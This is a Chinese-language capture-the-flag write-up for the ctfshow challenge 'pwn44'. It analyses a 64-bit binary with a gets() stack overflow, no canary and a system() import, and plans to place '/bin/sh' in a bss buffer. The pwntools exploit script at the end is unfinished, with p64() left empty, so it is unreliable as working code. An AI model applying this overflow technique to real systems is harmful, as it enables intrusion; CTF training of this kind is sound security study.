```
tasike@tasike-VM:~/Desktop$ chmod 777 pwn44
```

```
tasike@tasike-VM:~/Desktop$ file pwn44
pwn44: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=21ab50b60a15ea3e2b4ce46ee0a1f7135bb56f29, not stripped
```

```
tasike@tasike-VM:~/Desktop$ checksec pwn44
[*] '/home/tasike/Desktop/pwn44'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

64bit，堆栈不可执行

`ida`查看

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  init(argc, argv, envp);
  logo();
  puts("get system parameter!");
  ctfshow();
  return 0;
}
```

跟进`ctfshow`

```c
__int64 ctfshow()
{
  char v1[10]; // [rsp+6h] [rbp-Ah] BYREF

  return gets(v1);
}
```

> `buf`与`rbp`距离`0xA`

发现`_system`

```c
// attributes: thunk
int system(const char *command)
{
  return system(command);
}
```

没有`/bin/sh`字符串

但是可以注意`bss段`有一个`buf2`

```
.bss:0000000000602080                               public buf2
.bss:0000000000602080 ??                            buf2 db    ? ;
.bss:0000000000602081 ??                            db    ? ;
.bss:0000000000602082 ??                            db    ? ;
```

和上一题思路一样，只不过这题是64位的



编写`attack44.py`

```python
from pwn import *
context(os = 'Linux', arch = 'amd64', log_level = 'debug')
r = remote('pwn.challenge.ctf.show', 28130)
payload = cyclic(0xA + 0x8) + p64()
```

